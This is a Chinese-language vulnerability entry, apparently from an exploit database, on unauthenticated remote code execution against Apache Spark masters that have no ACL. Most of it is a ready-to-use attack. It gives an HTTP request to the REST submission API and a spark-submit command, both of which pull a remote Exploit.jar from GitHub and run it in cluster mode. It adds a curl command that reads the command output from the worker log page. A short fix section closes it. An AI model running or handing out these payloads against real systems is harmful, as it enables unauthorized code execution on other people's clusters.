---
id: SPARK-UNACC
title: Apache Spark 未授权访问导致远程代码执行漏洞
product: spark
vendor: Apache
version_affected: "全版本"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["Apache Spark", "Spark"]
---

## 漏洞描述

Apache Spark 是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动 ACL（访问控制），攻击者将可以在集群中执行任意代码。

## 影响版本

- 全版本（未启用 ACL 时）

## 前置条件

- 无需认证
- 需要能够访问 Spark 管理端口（8080/6066/7077）

## 利用步骤

1. 使用 REST API 提交恶意应用
2. 或使用 submissions 网关（7077 端口）提交

## Payload

```http
POST /v1/submissions/create HTTP/1.1
Host: target:6066
Content-Type: application/json

{
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "2.3.1",
  "appArgs": ["id"],
  "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
  "environmentVariables": {"SPARK_ENV_LOADED": "1"},
  "mainClass": "Exploit",
  "sparkProperties": {
    "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
    "spark.driver.supervise": "false",
    "spark.app.name": "Exploit",
    "spark.eventLog.enabled": "true",
    "spark.submit.deployMode": "cluster",
    "spark.master": "spark://target:6066"
  }
}
```

```bash
# 或使用 spark-submit
bin/spark-submit --master spark://target:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
```

## 验证方法

```bash
# 查看执行结果
curl "http://target:8081/logPage/?driverId={submissionId}&logType=stdout"
```

## 修复建议

1. 启用 Spark ACL（访问控制）
2. 限制管理端口访问来源
3. 使用防火墙保护 Spark 端口
